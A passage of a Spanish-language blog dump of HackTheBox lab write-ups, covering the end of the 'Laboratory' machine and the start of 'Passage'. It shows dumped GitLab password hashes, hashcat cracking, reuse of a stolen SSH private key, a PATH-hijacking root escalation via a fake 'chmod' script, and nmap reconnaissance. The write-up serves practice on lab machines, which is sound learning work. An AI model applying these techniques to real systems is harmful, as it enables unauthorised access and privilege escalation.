2021-01-29 18:48:12. 109994   lanz43   lanz@laboratory. htb   $2a$10$d1iFT3BRnuqkzprchrPof. 9Mv. DCjqPxziHowFhSfP7bFg6. HzYHu  \N   \N   \N   1    2021-01-29 18:48:12. 120568   2021-01-29 18:48:12. 120568   172. 17. 0. 1    172. 17. 0. 1   2021-01-29 18:48:12. 096365   2021-01-29 18:48:12. 858875   lanz  f    10               \N   0    \N   lanz  t    f   active  1    \N   \N   \N   \N   \N   2021-01-29 18:48:11. 977481   \N   \N   f        \N   lanz@laboratory. htb   f    f    \N   \N   \N   \N    f    \N       0    2    \N   0    f    \N   \N   \N   f    1jwc9nbz418ndij73kh3hw7u8    \N   f    f    48   \N   2021-01-29   fen   \N   \N   \N   \N   1    \N   RJMyoUczVKQogLZxez-G  f    \N   \N   \N   \N   \N   \N   \N   \N   \N   \Ngit@git:/dev/shm/test/db$ Perfecto, vemos el correo y adem√°s un hash‚Ä¶ Pero pues el m√≠o no interesa, veamos si podemos obtener m√°s usuarios apoy√°ndonos de las opciones -A (After) y -B (Before), para listar lineas antes y despu√©s de nuestra b√∫squeda: git@git:/dev/shm/test/db$ grep -i  lanz@  -B 3 -A 3 database. sql 30   test123@laboratory. htb $2a$10$i2s70e/JnuB7PZgwsIKXq. adqFoTmlY4fYPyrpn3. fe6J5seXqJYq  \N   \N   \N   1    2021-01-29 14:34:05. 460662   2021-01-29 14:34:05. 460662   172. 17. 0. 1    172. 17. 0. 1   2021-01-29 14:34:05. 445185   2021-01-29 14:34:05. 775697   test  f    10               \N   0    \N   test123 t    f   active  1    \N   \N   \N   \N   \N   2021-01-29 14:34:05. 344875   \N   \N   f        \N   test123@laboratory. htb f    f    \N   \N   \N   \N    f    \N       0    2    \N   0    f    \N   \N   \N   f    ak3v7vhrg4ncr5fydb5sidjro    \N   f    f    48   \N   2021-01-29   fen   \N   \N   \N   \N   1    \N   qKbE4G2UQ9mCEgaWYM2m  f    \N   \N   \N   \N   \N   \N   \N   \N   \N   \N1    admin@example. com    $2a$10$. 9fAYoRs9/Erjs0FH. OlN. OH. L4cj2at6RfTmIQ3CTEl2D4ylgJ6i  \N   \N   \N   9    2021-01-29 19:26:03. 945205   2020-10-20 18:39:24. 13278   172. 17. 0. 1    172. 17. 0. 1   2020-07-02 18:02:18. 859553   2021-01-29 19:26:03. 976187   Dexter McPherson    t    100000                 0    \N   dexter tf    active 1    \N   \N   \N   avatar. png   6nEdboVbdcGyZmgaJ-ym  2020-07-02 18:02:18. 623133   2020-07-02 18:37:11. 372854   dexter@laboratory. htb  f       \N    admin@example. com    f    f        \N   \N   \N   f    \N       0    2    \N   0    f    \N   \N   \N   f    bonf6hqghs7dp26rjj6f3w2w4        f    f    48   \N   2021-01-29   f    en   \N   \N   \N   \N   1    \N   RvtN2a2xGmyx2-fFL4T4  f    \N   f    \N   \N    \N   \N   \N   \N   \N   342   exp101t@laboratory. htb $2a$10$ICZBhypCVivQKB0n8YIxNuGr/YYMa4A9zGtOM0seJflZ7jiVCHfKG  \N   \N   \N   1    2021-01-29 18:47:30. 823162   2021-01-29 18:47:30. 823162   172. 17. 0. 1    172. 17. 0. 1   2021-01-29 18:47:30. 785264   2021-01-29 19:15:46. 002469   exp101t f    10               \N   0    \N   exp101t t    f   active  1    \N   \N   \N   \N   \N   2021-01-29 18:47:30. 66866    \N   \N   f        \N   exp101t@laboratory. htb f    f    \N   \N   \N   \N    f    \N       0    2    \N   0    f    \N   \N   \N   f    c30j1n6akc41gq3xnlbh3jxmp    \N   f    f    48   \N   2021-01-29   fen   \N   \N   \N   \N   1    \N   5f1AHFrApfeU4CqRs57H  f    \N   \N   \N   \N   \N   \N   \N   \N   \N   \N43   lanz@laboratory. htb   $2a$10$d1iFT3BRnuqkzprchrPof. 9Mv. DCjqPxziHowFhSfP7bFg6. HzYHu  \N   \N   \N   1    2021-01-29 18:48:12. 120568   2021-01-29 18:48:12. 120568   172. 17. 0. 1    172. 17. 0. 1   2021-01-29 18:48:12. 096365   2021-01-29 18:48:12. 858875   lanz  f    10               \N   0    \N   lanz  t    f   active  1    \N   \N   \N   \N   \N   2021-01-29 18:48:11. 977481   \N   \N   f        \N   lanz@laboratory. htb   f    f    \N   \N   \N   \N    f    \N       0    2    \N   0    f    \N   \N   \N   f    1jwc9nbz418ndij73kh3hw7u8    \N   f    f    48   \N   2021-01-29   fen   \N   \N   \N   \N   1    \N   RJMyoUczVKQogLZxez-G  f    \N   \N   \N   \N   \N   \N   \N   \N   \N   \N4    seven@laboratory. htb  $2a$10$HkBO3A4k6G42X85r0ZIpO. RlSLCg9igEaiiU8r44Ymd7e2nWcjixC  \N   \N   \N   3    2020-09-05 19:01:10. 34461    2020-07-17 19:03:51. 88634   172. 17. 0. 1    172. 17. 0. 1   2020-07-17 15:57:57. 446229   2020-09-05 19:01:10. 459181   Seven  f    100000                 0    \N   seven  t    f   active  1    \N   \N   \N   avatar. png   \N   2020-07-17 15:57:57. 260823   \N   \N   f        \N   seven@laboratory. htb  f    f        \N   \N    \N   f    \N       0    2    \N   0    f    \N   \N   \N   f    bvm8qb1ou3vg35u3tchcfzgp1        f    f    48   \N   2020-09-05   f    en   \N   \N   \N   \N   1    \N   2sHXWyKj3rwag36sVeP-  f    \N   f    seven@laboratory. htb  \N   \N   \N   \N   \N   \N   43    ghost@example. com        \N   \N   \N   0    \N   \N   \N   \N   2020-07-02 19:52:08. 183475   2020-07-02 19:52:08. 183475   Ghost User   f   100000              This is a  Ghost User , created to hold all issues authored by users that have since been deleted. This user cannot be removed. 0    \N   ghost  t   factive 1    \N   \N   \N   \N   tzyprXQ5VMAHsEjuex6L  \N   2020-07-02 19:52:08. 184131   \N   f        \N   \N   f    f    \N   \N   \N   \N    f    \N       0    2    \N   0    f    \N   \N   \N   f    1xvejv7i8oe8wluh6jtgeimge    \N   f    f    48   t    \N   f   en    \N   \N   \N   \N   1    \N   \N   f    \N   \N   \N   \N   \N   \N   \N   \N   \N   \N5    u@laboratory. htb    $2a$10$sXPLtsEKOUD. xg5WOj3B6. zuWNhVj/rYt4B2z0yAxYDkgswbJHJIW  \N   \N   \N   1    2021-01-29 07:09:51. 640403   2021-01-29 07:09:51. 640403   172. 17. 0. 1    172. 17. 0. 1   2021-01-29 07:09:51. 603953   2021-01-29 07:09:52. 168008   normann f    10               \N   0    \N   normann t    f   active  1    \N   \N   \N   \N   \N   2021-01-29 07:09:51. 42427    \N   \N   f        \N   u@laboratory. htb    f    f    \N   \N   \N   \N    f    \N       0    2    \N   0    f    \N   \N   \N   f    5oi076s0mnm5bhutjonx9tyqv    \N   f    f    48   \N   2021-01-29   fen   \N   \N   \N   \N   1    \N   Zsn5bxeDhqK47W89HrB7  f    \N   \N   \N   \N   \N   \N   \N   \N   \N   \Ngit@git:/dev/shm/test/db$ Es mucho texto y puede verse confuso, lo s√©, pero podemos destacar la fecha de creaci√≥n de los usuarios, si nos guiamos por eso, tenemos 3 interesantes: | username@correo   | Nombre      | Hash                             | Fecha creaci√≥n || -------------------- | :--------------- |:------------------------------------------------------------ | :------------- || admin@example. com  | Dexter McPherson | $2a$10$. 9fAYoRs9/Erjs0FH. OlN. OH. L4cj2at6RfTmIQ3CTEl2D4ylgJ6i | 2020-07-02   || seven@laboratory. htb | Seven      | $2a$10$HkBO3A4k6G42X85r0ZIpO. RlSLCg9igEaiiU8r44Ymd7e2nWcjixC | 2020-07-17   || ghost@example. com  | ghost      | -                              | 2020-07-02   | Perfeeecto, pues enfoquemosnos en esos hashes y veamos si los podemos crackear‚Ä¶ Apoyado de todos los ejemplos de hashes que tiene hashcat en su wiki, encontramos que son tipo bcrypt $2*$, Blowfish (Unix): Guardamos los hashes en un archivo y procedemos, usare hashcat: ‚Äì¬ª hashcat -m 3200 -a 0 hashes_t /usr/share/wordlists/rockyou. txt -o cracked_bro -m: Tipo de hash.  -a: Le indicamos que haga un ataque en modo diccionario.  hashes_t: Archivo con los hash.  . /rockyou. txt: Diccionario que usaremos.  -o: La salida la guarda en el archivo cracked_bro. Pero nada, no lo logramos‚Ä¶ As√≠ que de nuevo, estaba full estancado y ped√≠ ayuda: La ayuda me indico que fuera cauteloso con los archivos del . tar y que adem√°s me fijara en el output del proceso‚Ä¶ (Que lo puse arriba y ni me hab√≠a fijado): . . . * dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) . . . [DONE][SKIPPED] Wiki * dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) . . . [DONE][SKIPPED] Wiki. . . Donde tenemos dos proyectos:  securewebsite.  securedocker. Y tenemos una ruta para cada uno, inspeccionemos su contenido: git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ ls -latotal 0drwxr-xr-x 2 git git 40 Jan 31 22:45 . drwxr-xr-x 3 git git 80 Jan 31 22:45 . . git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ cd . . git@git:/dev/shm/test/repositories/@hashed/2c/62$ ls -latotal 7388drwxr-xr-x 3 git git   80 Jan 31 22:45 . drwxr-xr-x 3 git git   60 Jan 31 22:45 . . drwxr-xr-x 2 git git   40 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3-rw-r--r-- 1 git git 7563905 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3. bundlegit@git:/dev/shm/test/repositories/@hashed/2c/62$No tiene ning√∫n contenido la carpeta, pero una atr√°s contiene un archivo . bundle‚Ä¶ Despu√©s de otra vez estar perdido, buscando por internet nos damos cuenta de una genialidad con los archivos . bundle:  . . you want a single file that has your whole project and all the commits you‚Äôve made. You can use git bundle for this! blog. tplus1/git-bundle. Esto est√° muy loco porque significa que todo nuestro repositorio, commits, logs, etc. Lo podemos guardar en un √∫nico archivo, que en el caso ya de querer volver a ver los archivos, logs, commits del repositorio, lo √∫nico que debemos hacer es un git clone al . bundle:  $ git clone -b master /tmp/myproject. bundle myproject2$ cd myproject2   blog. tplus1/git-bundle.  Pues apoyados en esto, probemos a generar los dos repositorios y ver que podemos encontrar √∫til: ¬¨ securewebsite: * dexter/securewebsite (@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3) . . . [DONE]git@git:/dev/shm/test/repositories/@hashed/2c/62$ ls -latotal 7388drwxr-xr-x 3 git git   80 Jan 31 22:45 . drwxr-xr-x 3 git git   60 Jan 31 22:45 . . drwxr-xr-x 2 git git   40 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3-rw-r--r-- 1 git git 7563905 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3. bundlegit@git:/dev/shm/test/repositories/@hashed/2c/62$ git clone 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3. bundle Cloning into '2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3'. . . Receiving objects: 100% (66/66), 7. 21 MiB | 78. 58 MiB/s, done. Resolving deltas: 100% (5/5), done. git@git:/dev/shm/test/repositories/@hashed/2c/62$ ls -latotal 7388drwxr-xr-x 3 git git   80 Jan 31 22:45 . drwxr-xr-x 3 git git   60 Jan 31 22:45 . . drwxr-xr-x 5 git git   140 Jan 31 23:10 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3-rw-r--r-- 1 git git 7563905 Jan 31 22:45 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3. bundlegit@git:/dev/shm/test/repositories/@hashed/2c/62$ cd 2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3git@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ ls -latotal 12drwxr-xr-x 5 git git 140 Jan 31 23:10 . drwxr-xr-x 3 git git  80 Jan 31 22:45 . . drwxr-xr-x 7 git git 240 Jan 31 23:10 . git-rw-r--r-- 1 git git 430 Jan 31 23:10 CREDITS. txtdrwxr-xr-x 6 git git 120 Jan 31 23:10 assetsdrwxr-xr-x 2 git git 180 Jan 31 23:10 images-rw-r--r-- 1 git git 7045 Jan 31 23:10 index. htmlgit@git:/dev/shm/test/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3$ git logerror: cannot run less: No such file or directorycommit 5bd1925e5f8ce5ab97c5eef8a1c2cac3c778873f (HEAD -&gt; master, origin/master, origin/HEAD)Author: Dexter McPherson &lt;dexter@laboratory. htb&gt;Date:  Sun Jul 5 17:11:26 2020 +0200  Initial commitBien, pues despues de ojear los archivos no tenemos nada relevante, solo confirmamos el correo de dexter :P ¬¨ securedocker: * dexter/securedocker (@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7) . . . [DONE]git@git:/dev/shm/test/repositories/@hashed/19/58$ ls -latotal 4drwxr-xr-x 3 git git  80 Jan 31 22:45 . drwxr-xr-x 3 git git  60 Jan 31 22:45 . . drwxr-xr-x 2 git git  40 Jan 31 23:09 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7-rw-r--r-- 1 git git 3542 Jan 31 22:45 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7. bundlegit@git:/dev/shm/test/repositories/@hashed/19/58$ git clone 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7. bundle Cloning into '19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7'. . . Receiving objects: 100% (10/10), done. git@git:/dev/shm/test/repositories/@hashed/19/58$ ls -latotal 4drwxr-xr-x 3 git git  80 Jan 31 22:45 . drwxr-xr-x 3 git git  60 Jan 31 22:45 . . drwxr-xr-x 4 git git 120 Jan 31 23:09 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7-rw-r--r-- 1 git git 3542 Jan 31 22:45 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7. bundlegit@git:/dev/shm/test/repositories/@hashed/19/58$ cd 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7$ ls -latotal 8drwxr-xr-x 4 git git 120 Jan 31 23:09 . drwxr-xr-x 3 git git 80 Jan 31 22:45 . . drwxr-xr-x 7 git git 240 Jan 31 23:09 . git-rw-r--r-- 1 git git 37 Jan 31 23:09 README. md-rw-r--r-- 1 git git 382 Jan 31 23:09 create_gitlab. shdrwxr-xr-x 3 git git 100 Jan 31 23:09 dexterEn create_gitlab. sh tenemos la estructura del contenedor en el que estamos: git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7$ cat create_gitlab. sh #!/bin/bashmkdir /srv/gitlabexport GITLAB_HOME=/srv/gitlabdocker run --detach \ --hostname git. laboratory. htb \ --publish 60443:443 --publish 60080:80 --publish 60022:22 \ --name gitlab \ --restart always \ --volume $GITLAB_HOME/config:/etc/gitlab \ --volume $GITLAB_HOME/logs:/var/log/gitlab \ --volume $GITLAB_HOME/data:/var/opt/gitlab \ gitlab/gitlab-ce:latestSi revisamos la carpeta /dexter obtenemos info muy valiosa: git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7$ cd dexter/git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ ls -latotal 8drwxr-xr-x 3 git git 100 Jan 31 23:09 . drwxr-xr-x 4 git git 120 Jan 31 23:09 . . drwxr-xr-x 2 git git 80 Jan 31 23:09 . ssh-rw-r--r-- 1 git git 102 Jan 31 23:09 recipe. url-rw-r--r-- 1 git git 160 Jan 31 23:09 todo. txtgit@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ ls -la . ssh/total 8drwxr-xr-x 2 git git  80 Jan 31 23:09 . drwxr-xr-x 3 git git 100 Jan 31 23:09 . . -rw-r--r-- 1 git git 568 Jan 31 23:09 authorized_keys-rw-r--r-- 1 git git 2601 Jan 31 23:09 id_rsagit@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ cat . ssh/id_rsa  Las llaves de SSH siempre son generadas en pares con una llamada llave privada y otra llamada llave p√∫blica. La llave privada solo es conocida por el usuario y debe ser guardada con cuidado. ArchLinux. org ¬øPero por qu√© con ‚Äúcuidado‚Äù? Como bien dice ehu. eus en su web, ‚ÄúCuando tenemos que conectarnos habitualmente a un servidor Linux mediante SSH puede resultar muy tedioso tener que escribir la contrase√±a en cada sesi√≥n. ‚Äù Por lo que muchas veces las llaves SSH nos ‚Äúfacilitan‚Äù la vida, donde la llave p√∫blica (id_rsa. pub) le indica a la m√°quina que nos permita ingresar sin contrase√±a, pero solo si estamos agregados (id_rsa. pub) en el archivo authorized_keys. Digamos que en este caso deber√≠amos estar en el archivo /home/dexter/. ssh/authorized_keys, para conectarnos como dexter en el sistema‚Ä¶ En el caso de root si estuvieramos en su archivo (. . /. . /rutaXD), pues si, nos conectar√≠amos como root. (Pero a esto no le podemos sacar provecho en este momento). Pero donde la llave id_rsa le indica al sistema que pr√°cticamente estamos proveyendo una contrase√±a (aunque ni tengamos indicios de como sea) del usuario al que le extraimos la llave, en este caso dexter. . Muy bien, tenemos la llave de acceso al sistema (id_rsa) presuntamente como el usuario dexter, probemos: La guardamos en un archivo, lo llamar√© id_dexter, le otorgamos permisos: chmod 600 id_dexter y ejecutamos mediante SSH: ‚Äì¬ª ssh dexter@10. 10. 10. 216 -i id_dexterdexter@laboratory:~$ iduid=1000(dexter) gid=1000(dexter) groups=1000(dexter)dexter@laboratory:~$ lsuser. txtdexter@laboratory:~$ Perfecto, estamos dentro como dexter‚Ä¶ Nice, pero antes de seguir, revisemos si los archivos del repositorio tienen algo m√°s: git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ cat todo. txt# DONE: Secure docker for regular users### DONE: Automate docker security on startup# TODO: Look into  docker compose # TODO: Permanently ban DeeDee from labJmm, look into  docker compose  me llama la atenci√≥n, no se si sea relevante, pero para tenerlo en cuenta (: El otro archivo tiene una URL: git@git:/dev/shm/test/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7/dexter$ cat recipe. url [InternetShortcut]URL=https://www. seriouseats. com/recipes/2016/04/french-omelette-cheese-recipe. htmlNada relevante. Enumeremos ahora como dexter dentro de la m√°quina‚Ä¶ ‚Ä¶ Escalada de privilegios #: Buscando por los archivos relacionados con el grupo dexter obtenemos esto: dexter@laboratory:~$ find / -group dexter 2&gt;/dev/null | grep -v proc/usr/local/bin/docker-security/home/dexter/home/dexter/. local/home/dexter/. local/share/home/dexter/. local/share/nano/home/dexter/. local/share/nano/search_history/home/dexter/. profile/home/dexter/. gnupg/home/dexter/. gnupg/pubring. kbx/home/dexter/. gnupg/trustdb. gpg/home/dexter/. cache/home/dexter/. cache/motd. legal-displayed/home/dexter/. ssh/home/dexter/user. txt/home/dexter/. bashrc/home/dexter/. bash_logoutdexter@laboratory:~$ /usr/local/bin/docker-security. Si vemos como est√° definido el archivo tenemos claro que debemos usarlo para escalar privilegios: Tenemos un objeto creado por el usuario root y que cuando lo ejecutemos estaremos ejecut√°ndolo como root no como dexter :O los famosos SUID (Set User ID).  SUID? ‚Ä¶ it‚Äôs a way in UNIX-like operating systems of running a command as another user without providing credentials. pentestpartners. com/exploiting-suid-executables. Perfectoooooo‚Ä¶ Pero ejecut√°ndolo no tenemos ning√∫n output, jmmm, que tipo de archivo es?: dexter@laboratory:~$ file /usr/local/bin/docker-security/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64. so. 2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3. 2. 0, not strippedUn binario, inicialmente en internet no encontramos nada relacionado con √©l, probemos a ver si vemos alguna cadena de texto interesante. La herramienta strings no est√° instalada, intentemos con cat: dexter@laboratory:~$ cat /usr/local/bin/docker-securityELF&gt;p@9@8. . . . . . H0zRx{UHH=H=]AWL=O,AVIAUIATAUH-@,SL)CHtLLDAHH9u[]A\A]A^A_chmod 700 /usr/bin/dockerchmod 660 /var/run/docker. sock&lt;(X  Rx. . . . . . Vemos que presuntamente est√° cambiando los permisos de los archivos /usr/bin/docker y /var/run/docker. sock. Tambi√©n podemos verlo m√°s claro con ltrace (nos ayuda a ver las llamadas que hace un programa sobre el sistema): dexter@laboratory:~$ ltrace /usr/local/bin/docker-securitysetuid(0)                                                       = -1setgid(0)                                                       = -1system( chmod 700 /usr/bin/docker chmod: changing permissions of '/usr/bin/docker': Operation not permitted &lt;no return . . . &gt;--- SIGCHLD (Child exited) ---&lt;. . . system resumed&gt; )                                                 = 256system( chmod 660 /var/run/docker. sock chmod: changing permissions of '/var/run/docker. sock': Operation not permitted &lt;no return . . . &gt;--- SIGCHLD (Child exited) ---&lt;. . . system resumed&gt; )                                                 = 256+++ exited (status 0) +++Ac√° est√° m√°s claro (creo yo :P), intenta cambiar los permisos, pero no permite la acci√≥n‚Ä¶ Pero hay algo curioso, est√° llamando a docker por su ruta absoluta (/usr/bin/docker) y al archivo docker. sock tambi√©n por su ruta completa (/var/run/docker. sock), pero chmod est√° siendo llamado en general‚Ä¶ Lo que pasa ah√≠ es que cuando ejecutamos chmod, el sistema va a buscar el binario en todas las rutas del PATH (echo $PATH), ira recorriendo cada directorio y donde primero lo encuentre, ser√° ese el que ejecute‚Ä¶ Sabiendo esto, podemos aprovecharnos para hacer un PATH Hijacking, en el que crearemos un archivo llamado chmod, en su contenido le indicamos que nos genere una Shell, modificaremos el PATH para que si o si encuentre primero nuestro binario y lo ejecute. Consiguiendo as√≠ una Shell como el usuario administrador del sistema (root). Prend√°mosle fuego:  M√°s info sobre PATH Hijacking. - hackingarticles. in/linux-privesc-using-path-variable. ‚Ä¶ ¬¨ Creamos el archivo chmod: dexter@laboratory:/dev/shm$ echo '#!/bin/bash' &gt; chmoddexter@laboratory:/dev/shm$ which bash/usr/bin/bash#Con esta linea obtendremos una `bash`. dexter@laboratory:/dev/shm$ echo '/usr/bin/bash' &gt;&gt; chmod #Otorgamos permisos de ejecuci√≥n. dexter@laboratory:/dev/shm$ chmod +x chmod #Validamos. dexter@laboratory:/dev/shm$ cat chmod #!/bin/bash/usr/bin/bashdexter@laboratory:/dev/shm$ Si lo probamos con dexter pasar√≠a esto: dexter@laboratory:/dev/shm$ /bin/sh$ . /chmoddexter@laboratory:/dev/shm$ ¬¨ Modificamos la variable PATH. : dexter@laboratory:/dev/shm$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin#La guardamos en otra variable por si algo. dexter@laboratory:/dev/shm$ old_path=$PATH#Le indicamos donde esta nuestro binario, esa ruta quedara de primero, en mi caso `/dev/shm`. dexter@laboratory:/dev/shm$ export PATH=/dev/shm:$PATH#La nueva variable `PATH`. dexter@laboratory:/dev/shm$ echo $PATH/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bindexter@laboratory:/dev/shm$Perfecto, ahora simplemente nos quedar√≠a ejecutar el binario /usr/local/bin/docker-security. ¬¨ Ejecutar el PATH Hijacking. : Opa, si se√±or, somos root „ÉÑ Solo nos quedar√≠a ver las flags: ‚Ä¶ Y hemos acabado paaaaaaaaaarce. e Me gusto la m√°quina, mientras ve√≠a como jugar con los archivos . bundle me pareci√≥ que eso si debe ser muy real, a mucha gente se le debe colar/olvidar/dar-igual el archivo id_rsa. Jajaj o pues espero que no :P Me encanta hacer PATH Hijacking as√≠ que eso tambi√©n me subi√≥ mucho m√°s el √°nimo por la m√°quina‚Ä¶ Esto es todo por ahora, muchas gracias por pasarte y leer y nada, a seguir rompiendo todo ‚ô• "
    }, {
    "id": 58,
    "url": "http://localhost:4000/htb/passage",
    "title": "HackTheBox - Passage",
    "body": "2021/03/06 - M√°quina Linux nivel medio. Explotaremos el servicio CuteNews para ejecutar comandos en el sistema, despu√©s jugaremos con hashes y crackeo. Jugaremos con llaves privadas y romperemos un proceso que se ejecuta con privilegios de administrador (USBCreator) para extraer archivos del sistema como usuario administrador.  TL;DR (Spanish writeup): Creador: ChefByzen. Hola hola! Empezaremos enumerando un servicio web, en el que no ser√° necesario hacer fuerza bruta, simplemente abrir bien los ojos. Encontraremos una ruta hacia el servicio CuteNews, nos mirara a la cara un login y un √°rea para registrarnos, despues de crear la cuenta obtendremos la versi√≥n del software, buscando en internet nos topamos con un Arbitrary File Upload del cual nos aprovecharemos jugando con los Magic Bytes para subir un archivo PHP y ejecutar comandos en el sistema remotamente. Enumerando obtenemos dos usuarios en el sistema: paul y nadav‚Ä¶ Adem√°s en el directorio CuteNews encontraremos unos hashes, usaremos hashcat para crackearlos y obtener la contrase√±a del usuario paul. Migraremos a nadav con la llave privada del mismo encontrada en el /home de paul Para la escalada de privilegios encontraremos un proceso ejecut√°ndose con privilegios de administrador (USBCreator), buscando en internet sobre √©l y exploits asociados, usando gdbus tenemos la capacidad de hacer uso de USBCreator. Image para (entre varios procesos) copiar archivos del sistema como el usuario root. Usaremos eso para extraer la llave privada (id_rsa) de √©l e ingresar como hicimos con el usuario nadav al sistema. Clasificaci√≥n de la m√°quina. : Tirando a real (:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Fases:  Enumeraci√≥n.  Movimiento lateral.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Empezamos realizando un escaneo de puertos sobre la m√°quina para saber que servicios est√° corriendo. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 206 -oG initScanEn este caso fue r√°pido, as√≠ que no tuvimos que agregarle m√°s argumentos para acelerar el proceso.       Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Sun Dec 13 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10. 10. 10. 206# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 206 ()  Status: UpHost: 10. 10. 10. 206 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Sun Dec 13 25:25:25 2020 -- 1 IP address (1 host up) scanned in 161. 87 secondsMuy bien, tenemos los siguientes servicios:       Puerto   Descripci√≥n         22   SSH: Conexion remota segura mediante una shell       80   HTTP: Servidor web   Hagamos nuestro escaneo de versiones y scripts con base en cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 22,80 -sC -sV 10. 10. 10. 206 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Sun Dec 13 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 206Nmap scan report for 10. 10. 10. 206Host is up (0. 19s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 2p2 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)|  256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http  Apache httpd 2. 4. 18 ((Ubuntu))|_http-server-header: Apache/2. 4. 18 (Ubuntu)|_http-title: Passage NewsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Sun Dec 13 25:25:25 2020 -- 1 IP address (1 host up) scanned in 18. 71 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 2p2 Ubuntu 4       80   HTTP   Apache httpd 2. 4. 18   ‚Ä¶ Puerto 80 ‚åñ: Se nos presentan varias ‚Äúnoticias‚Äù, en la que la inicial parece ser la m√°s importante, veamos de que se trata: Han 